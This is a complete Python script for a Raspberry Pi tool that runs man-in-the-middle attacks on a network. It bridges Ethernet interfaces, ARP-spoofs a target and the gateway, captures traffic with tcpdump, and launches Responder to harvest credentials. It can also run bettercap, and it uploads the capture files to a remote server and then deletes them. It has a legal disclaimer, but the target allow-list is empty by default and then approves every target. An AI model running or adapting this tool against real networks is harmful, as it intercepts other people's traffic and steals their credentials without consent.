#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import logging
from datetime import datetime
import json
import netifaces
import requests
import readline
import re
import urllib.request
import shutil

# ASCII Art
ASCII_ART = r"""
  __  __ ___ _____ __  __    ___ _   _ _  _______ ____  
 |  \/  |_ _|_   _|  \/  |  |_ _| \ | | |/ / ____|  _ \ 
 | |\/| || |  | | | |\/| |   | ||  \| | ' /|  _| | |_) |
 | |  | || |  | | | |  | |   | || |\  | . \| |___|  _ < 
 |_|  |_|___| |_| |_|  |_|  |___|_| \_|_|\_\_____|_| \_\
 
 Raspberry Pi MITM Network Auditing Tool
"""

# Configuration
CONFIG_FILE = "/etc/mitm_tool/config.json"
LOG_FILE = "/var/log/mitm_tool.log"
DATA_DIR = "/var/lib/mitm_tool/captures"
REMOTE_UPLOAD_URL = "https://your-remote-endpoint.com/api/upload"
MAC_VENDOR_DB_URL = "https://standards-oui.ieee.org/oui/oui.txt"
MAC_VENDOR_CACHE = "/tmp/mac_vendors.txt"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class MITMTool:
    def __init__(self):
        self.load_config()
        self.check_safety()
        self.setup_environment()
        self.interfaces = {}
        self.targets = []
        self.capture_processes = {}
        self.mac_vendors = {}
        self.load_mac_vendors()
        
    def load_mac_vendors(self):
        """Load MAC vendor database for device identification"""
        try:
            # Download if file doesn't exist or is older than 30 days
            if not os.path.exists(MAC_VENDOR_CACHE) or (time.time() - os.path.getmtime(MAC_VENDOR_CACHE)) > 2592000:
                logger.info("Downloading MAC vendor database...")
                urllib.request.urlretrieve(MAC_VENDOR_DB_URL, MAC_VENDOR_CACHE + ".new")
                shutil.move(MAC_VENDOR_CACHE + ".new", MAC_VENDOR_CACHE)

            with open(MAC_VENDOR_CACHE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if "(base 16)" in line:
                        parts = line.split("(base 16)")
                        mac_prefix = parts[0].strip().replace('-', ':')
                        vendor = parts[1].strip()
                        self.mac_vendors[mac_prefix] = vendor
            logger.info(f"Loaded {len(self.mac_vendors)} MAC vendors")
        except Exception as e:
            logger.error(f"Failed to load MAC vendors: {str(e)}")

    def get_device_type(self, mac):
        """Identify device type from MAC address"""
        if not mac or not self.mac_vendors:
            return "Unknown"
        
        mac = mac.upper().replace('-', ':')
        if len(mac) < 8:
            return "Unknown"
        
        oui = mac[:8]
        if oui in self.mac_vendors:
            vendor = self.mac_vendors[oui]
            
            # Common device mappings
            if "Apple" in vendor:
                return "Apple Device"
            elif "Samsung" in vendor:
                return "Samsung Device"
            elif "Amazon" in vendor:
                return "Amazon Device (Alexa/Echo)"
            elif "Google" in vendor:
                return "Google Device (Nest/Home)"
            elif "Raspberry" in vendor:
                return "Raspberry Pi"
            elif "TP-Link" in vendor:
                return "TP-Link Device"
            elif "Xiaomi" in vendor:
                return "Xiaomi Device"
            elif "Dell" in vendor:
                return "Dell Computer"
            elif "LG" in vendor:
                return "LG Device"
            elif "Sony" in vendor:
                return "Sony Device"
            elif "Microsoft" in vendor:
                return "Microsoft Device"
            return vendor
        return "Unknown"

    def load_config(self):
        """Load configuration from file"""
        try:
            with open(CONFIG_FILE) as f:
                self.config = json.load(f)
            logger.info("Configuration loaded successfully")
        except (FileNotFoundError, json.JSONDecodeError):
            self.config = {
                "remote_upload": False,
                "auto_start": False,
                "allowed_networks": [],
                "legal_disclaimer_accepted": False
            }
            logger.warning("Using default configuration")

    def check_safety(self):
        """Display legal disclaimers and safety checks"""
        disclaimer = """
        WARNING: This tool is for authorized security auditing and penetration testing only.
        Unauthorized use is illegal and unethical. By using this tool, you agree that:
        
        1. You have explicit permission to test the network you're targeting
        2. You understand the legal implications of network monitoring
        3. You will not use this tool for malicious purposes
        
        The developers assume no liability for misuse of this software.
        """
        print(disclaimer)
        
        if not self.config.get("legal_disclaimer_accepted", False):
            response = input("Do you accept these terms? (yes/no): ").strip().lower()
            if response != "yes":
                print("Exiting...")
                sys.exit(0)
            self.config["legal_disclaimer_accepted"] = True
            self.save_config()

    def save_config(self):
        """Save configuration to file"""
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)

    def setup_environment(self):
        """Create necessary directories and check dependencies"""
        os.makedirs(DATA_DIR, exist_ok=True)
        
        # Check for required tools
        required_tools = [
            'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
            'bettercap', 'responder', 'tailscale', 'iwlist',
            'brctl', 'ifconfig', 'arp'
        ]
        
        missing_tools = []
        for tool in required_tools:
            if not self.check_tool_installed(tool):
                missing_tools.append(tool)
                
        if missing_tools:
            logger.error(f"Missing required tools: {', '.join(missing_tools)}")
            sys.exit(1)

    def check_tool_installed(self, tool):
        """Check if a command line tool is installed"""
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def detect_interfaces(self):
        """Detect available network interfaces"""
        self.interfaces = {}
        try:
            interfaces = netifaces.interfaces()
            
            for iface in interfaces:
                if iface.startswith('eth') or iface.startswith('en') or iface.startswith('wlan'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        ip_info = addrs[netifaces.AF_INET][0]
                        self.interfaces[iface] = {
                            'ip': ip_info.get('addr', ''),
                            'netmask': ip_info.get('netmask', ''),
                            'mac': addrs[netifaces.AF_LINK][0]['addr'] if netifaces.AF_LINK in addrs else '',
                            'type': 'wifi' if iface.startswith('wlan') else 'ethernet'
                        }
            
            logger.info(f"Detected interfaces: {json.dumps(self.interfaces, indent=2)}")
            return len(self.interfaces) >= 1
            
        except Exception as e:
            logger.error(f"Error detecting interfaces: {str(e)}")
            return False

    def setup_bridge(self):
        """Bridge two Ethernet interfaces"""
        ethernet_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'ethernet']
        
        if len(ethernet_ifaces) < 2:
            logger.error("Need at least two Ethernet interfaces to create a bridge")
            return False
            
        iface1, iface2 = ethernet_ifaces[:2]
        
        try:
            subprocess.run(["sudo", "ifconfig", iface1, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "ifconfig", iface2, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "brctl", "addbr", "mitm-bridge"], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface1], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface2], check=True)
            subprocess.run(["sudo", "ifconfig", "mitm-bridge", "up"], check=True)
            logger.info(f"Successfully bridged {iface1} and {iface2} via mitm-bridge")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to create bridge: {str(e)}")
            return False

    def network_scan(self):
        """Perform network scan using nmap and arp-scan"""
        if not self.interfaces:
            logger.error("No interfaces detected")
            return
            
        interface = list(self.interfaces.keys())[0]
        
        try:
            logger.info("Running ARP scan...")
            arp_scan = subprocess.run(
                ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                capture_output=True, text=True
            )
            print(arp_scan.stdout)
            
            logger.info("Running Nmap scan...")
            subnet = self.get_subnet(interface)
            if subnet:
                nmap_scan = subprocess.run(
                    ["sudo", "nmap", "-sV", "-O", subnet],
                    capture_output=True, text=True
                )
                print(nmap_scan.stdout)
                
        except Exception as e:
            logger.error(f"Scanning failed: {str(e)}")

    def get_subnet(self, interface):
        """Calculate subnet from interface IP and netmask"""
        if interface not in self.interfaces:
            return None
            
        ip = self.interfaces[interface]['ip']
        netmask = self.interfaces[interface]['netmask']
        
        if not ip or not netmask:
            return None
            
        if netmask == "255.255.255.0":
            return ".".join(ip.split(".")[:3]) + ".0/24"
        return None

    def arp_spoof(self, target_ip, gateway_ip):
        """Start ARP spoofing between target and gateway"""
        if not self.check_target_safety(target_ip):
            logger.error(f"Target {target_ip} is not in allowed networks")
            return
            
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
            cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
            self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
            self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
            logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
            return True
            
        except Exception as e:
            logger.error(f"ARP spoofing failed: {str(e)}")
            return False

    def check_target_safety(self, target_ip):
        """Check if target is in allowed networks"""
        if not self.config.get("allowed_networks"):
            return True
            
        for network in self.config.get("allowed_networks", []):
            if target_ip.startswith(network):
                return True
        return False

    def start_packet_capture(self, interface="mitm-bridge", filename=None):
        """Start packet capture with tcpdump"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
            
        try:
            cmd = [
                "sudo", "tcpdump", "-i", interface, 
                "-w", filename, "-s", "0", 
                "not port 22"
            ]
            self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
            logger.info(f"Packet capture started on {interface}, saving to {filename}")
            return True
            
        except Exception as e:
            logger.error(f"Packet capture failed: {str(e)}")
            return False

    def start_responder(self, interface="mitm-bridge"):
        """Start Responder for credential harvesting"""
        try:
            cmd = [
                "sudo", "responder", "-I", interface,
                "-w", "-d", "--lm"
            ]
            self.capture_processes['responder'] = subprocess.Popen(cmd)
            logger.info(f"Responder started on {interface}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Responder: {str(e)}")
            return False

    def start_bettercap(self, script_path=None):
        """Start bettercap with optional script"""
        try:
            cmd = ["sudo", "bettercap", "-iface", "mitm-bridge"]
            if script_path and os.path.exists(script_path):
                cmd.extend(["-eval", f"load {script_path}"])
            self.capture_processes['bettercap'] = subprocess.Popen(cmd)
            logger.info("Bettercap started")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start bettercap: {str(e)}")
            return False

    def stop_all_attacks(self):
        """Stop all running attack processes"""
        for name, process in self.capture_processes.items():
            try:
                process.terminate()
                process.wait(timeout=5)
                logger.info(f"Stopped {name}")
            except:
                try:
                    process.kill()
                    logger.warning(f"Force stopped {name}")
                except:
                    logger.error(f"Failed to stop {name}")
                    
        self.capture_processes = {}
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
        logger.info("All attacks stopped")

    def upload_data(self):
        """Upload captured data to remote endpoint"""
        if not self.config.get("remote_upload", False):
            logger.info("Remote upload disabled in config")
            return False
            
        try:
            files = []
            for f in os.listdir(DATA_DIR):
                if f.endswith(".pcap") or f.endswith(".log"):
                    files.append(os.path.join(DATA_DIR, f))
                    
            if not files:
                logger.info("No capture files to upload")
                return False
                
            for file_path in files:
                with open(file_path, 'rb') as f:
                    files = {'file': (os.path.basename(file_path), f)}
                    response = requests.post(
                        REMOTE_UPLOAD_URL,
                        files=files,
                        headers={'Authorization': f'Bearer {self.config.get("api_key", "")}'}
                    )
                    
                    if response.status_code == 200:
                        logger.info(f"Successfully uploaded {file_path}")
                        os.remove(file_path)
                    else:
                        logger.error(f"Upload failed for {file_path}: {response.text}")
                        
            return True
            
        except Exception as e:
            logger.error(f"Upload failed: {str(e)}")
            return False

    def get_connected_wifi_devices(self, interface):
        """Get devices connected to WiFi network using multiple methods"""
        try:
            logger.info(f"Checking connected devices on {interface}...")
            devices = []
            
            try:
                arp_result = subprocess.run(
                    ["arp", "-a", "-i", interface],
                    capture_output=True, text=True
                )
                devices.extend(self.parse_arp_output(arp_result.stdout))
            except Exception as e:
                logger.warning(f"ARP scan failed: {str(e)}")

            try:
                with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                    dhcp_leases = f.readlines()
                devices.extend(self.parse_dhcp_leases(dhcp_leases))
            except Exception as e:
                logger.warning(f"DHCP leases read failed: {str(e)}")

            try:
                subnet = self.get_subnet(interface)
                if subnet:
                    nmap_result = subprocess.run(
                        ["sudo", "nmap", "-sn", subnet],
                        capture_output=True, text=True
                    )
                    devices.extend(self.parse_nmap_scan(nmap_result.stdout))
            except Exception as e:
                logger.warning(f"Nmap scan failed: {str(e)}")

            try:
                if not devices and subnet:
                    ping_result = subprocess.run(
                        ["sudo", "nmap", "-sn", "-PE", subnet],
                        capture_output=True, text=True
                    )
                    devices.extend(self.parse_nmap_scan(ping_result.stdout))
            except Exception as e:
                logger.warning(f"Ping sweep failed: {str(e)}")

            unique_devices = {}
            for device in devices:
                if 'mac' in device and device['mac']:
                    unique_devices[device['mac']] = device
                elif 'ip' in device and device['ip']:
                    unique_devices[device['ip']] = device

            return list(unique_devices.values())
            
        except Exception as e:
            logger.error(f"Failed to get connected devices: {str(e)}")
            return []

    def parse_arp_output(self, arp_output):
        """Parse ARP table output with device identification"""
        devices = []
        for line in arp_output.split('\n'):
            if "ether" in line:
                parts = line.split()
                mac = parts[3].lower()
                device_type = self.get_device_type(mac)
                devices.append({
                    'ip': parts[1].strip('()'),
                    'mac': mac,
                    'type': device_type,
                    'interface': parts[5],
                    'method': 'arp'
                })
        return devices

    def parse_dhcp_leases(self, dhcp_leases):
        """Parse DHCP leases file with device identification"""
        devices = []
        for lease in dhcp_leases:
            parts = lease.strip().split()
            if len(parts) >= 4:
                mac = parts[1].lower()
                device_type = self.get_device_type(mac)
                devices.append({
                    'ip': parts[2],
                    'mac': mac,
                    'hostname': parts[3],
                    'type': device_type,
                    'method': 'dhcp'
                })
        return devices

    def parse_nmap_scan(self, nmap_output):
        """Parse nmap scan output with device identification"""
        devices = []
        current_ip = None
        current_mac = None
        
        for line in nmap_output.split('\n'):
            if "Nmap scan report for" in line:
                current_ip = line.split()[-1].strip('()')
            elif "MAC Address:" in line:
                current_mac = line.split("MAC Address: ")[1].split()[0].lower()
                if current_ip and current_mac:
                    device_type = self.get_device_type(current_mac)
                    devices.append({
                        'ip': current_ip,
                        'mac': current_mac,
                        'type': device_type,
                        'method': 'nmap'
                    })
                    current_ip = None
                    current_mac = None
            elif "Host is up" in line and current_ip and not current_mac:
                devices.append({
                    'ip': current_ip,
                    'type': 'Unknown',
                    'method': 'ping'
                })
                current_ip = None
                
        return devices

    def scan_wifi_networks(self, interface):
        """Scan for available WiFi networks"""
        try:
            logger.info(f"Scanning WiFi networks on {interface}...")
            scan_result = subprocess.run(
                ["sudo", "iwlist", interface, "scan"],
                capture_output=True, text=True
            )
            networks = []
            current_net = {}
            
            for line in scan_result.stdout.split('\n'):
                line = line.strip()
                if "Cell" in line and "- Address:" in line:
                    if current_net:
                        networks.append(current_net)
                    current_net = {'mac': line.split("Address: ")[1]}
                elif "ESSID:" in line:
                    current_net['ssid'] = line.split('"')[1]
                elif "Channel:" in line:
                    current_net['channel'] = line.split(":")[1]
                elif "Quality=" in line:
                    match = re.search(r'Quality=(\d+/\d+)', line)
                    if match:
                        current_net['quality'] = match.group(1)
                    match = re.search(r'level=(-?\d+)', line)
                    if match:
                        current_net['signal'] = match.group(1)
            
            if current_net:
                networks.append(current_net)
                
            return networks
            
        except Exception as e:
            logger.error(f"WiFi scan failed: {str(e)}")
            return []

    def show_main_menu(self):
        """Display the main menu with ASCII art"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(ASCII_ART)
        print("\n" + "="*50)
        print(" MAIN MENU".center(50))
        print("="*50)
        print("\n1. Network Scanning Tools")
        print("2. MITM Attack Tools")
        print("3. Packet Capture & Analysis")
        print("4. Credential Harvesting")
        print("5. WiFi Scanning Tools")
        print("6. System Configuration")
        print("7. Stop All Attacks")
        print("8. Exit")

    def show_wifi_menu(self):
        """Display WiFi scanning menu"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(ASCII_ART)
        print("\n" + "="*50)
        print(" WIFI SCANNING MENU".center(50))
        print("="*50)
        print("\n1. Scan for WiFi Networks")
        print("2. List Connected WiFi Devices")
        print("3. Return to Main Menu")

    def handle_wifi_menu(self):
        """Handle WiFi scanning menu with device names"""
        wifi_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'wifi']
        if not wifi_ifaces:
            print("\nNo WiFi interfaces found!")
            time.sleep(2)
            return
            
        iface = wifi_ifaces[0]
        
        while True:
            self.show_wifi_menu()
            choice = input("\nSelect an option (1-3): ").strip()
            
            if choice == "1":
                networks = self.scan_wifi_networks(iface)
                print("\nAvailable WiFi Networks:")
                for i, net in enumerate(networks, 1):
                    print(f"{i}. {net.get('ssid', 'Hidden')} (MAC: {net.get('mac')})")
                    print(f"   Channel: {net.get('channel')}, Signal: {net.get('signal', '?')} dBm")
                input("\nPress Enter to continue...")
                
            elif choice == "2":
                devices = self.get_connected_wifi_devices(iface)
                print("\nConnected WiFi Devices:")
                for i, dev in enumerate(devices, 1):
                    print(f"{i}. IP: {dev.get('ip')}, MAC: {dev.get('mac')}")
                    print(f"   Device Type: {dev.get('type', 'Unknown')}")
                    if 'hostname' in dev:
                        print(f"   Hostname: {dev.get('hostname')}")
                    print(f"   Detected via: {dev.get('method')}")
                    print("")
                input("\nPress Enter to continue...")
                
            elif choice == "3":
                break
            else:
                print("Invalid choice")
                time.sleep(1)

    def interactive_menu(self):
        """Main interactive menu"""
        while True:
            self.show_main_menu()
            choice = input("\nSelect an option (1-8): ").strip()
            
            try:
                if choice == "1":
                    self.network_scan()
                    input("\nPress Enter to continue...")
                elif choice == "2":
                    target = input("Enter target IP: ").strip()
                    gateway = input("Enter gateway IP: ").strip()
                    self.arp_spoof(target, gateway)
                    input("\nPress Enter to continue...")
                elif choice == "3":
                    filename = input(f"Enter filename (default: {DATA_DIR}/capture_<timestamp>.pcap): ").strip()
                    if not filename:
                        filename = None
                    self.start_packet_capture(filename=filename)
                    input("\nPress Enter to continue...")
                elif choice == "4":
                    self.start_responder()
                    input("\nPress Enter to continue...")
                elif choice == "5":
                    self.handle_wifi_menu()
                elif choice == "6":
                    print("\nConfiguration options:")
                    print("1. Toggle remote upload (current: {})".format(
                        "Enabled" if self.config.get("remote_upload") else "Disabled"))
                    print("2. Add allowed network")
                    config_choice = input("Select option: ").strip()
                    input("\nPress Enter to continue...")
                elif choice == "7":
                    self.stop_all_attacks()
                    input("\nPress Enter to continue...")
                elif choice == "8":
                    self.stop_all_attacks()
                    print("\nGoodbye!")
                    break
                else:
                    print("Invalid choice")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\nOperation cancelled")
                time.sleep(1)
            except Exception as e:
                logger.error(f"Error: {str(e)}")
                time.sleep(2)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("This script must be run as root")
        sys.exit(1)
        
    tool = MITMTool()
    
    if tool.detect_interfaces():
        ethernet_ifaces = [iface for iface in tool.interfaces if tool.interfaces[iface]['type'] == 'ethernet']
        if len(ethernet_ifaces) >= 2:
            if tool.setup_bridge():
                print("\nNetwork bridge setup successfully")
                time.sleep(2)
            else:
                print("\nFailed to setup bridge")
                time.sleep(2)
        else:
            print("\nNot enough Ethernet interfaces for bridging")
            time.sleep(2)
    else:
        print("\nNo network interfaces detected")
        time.sleep(2)
    
    tool.interactive_menu()
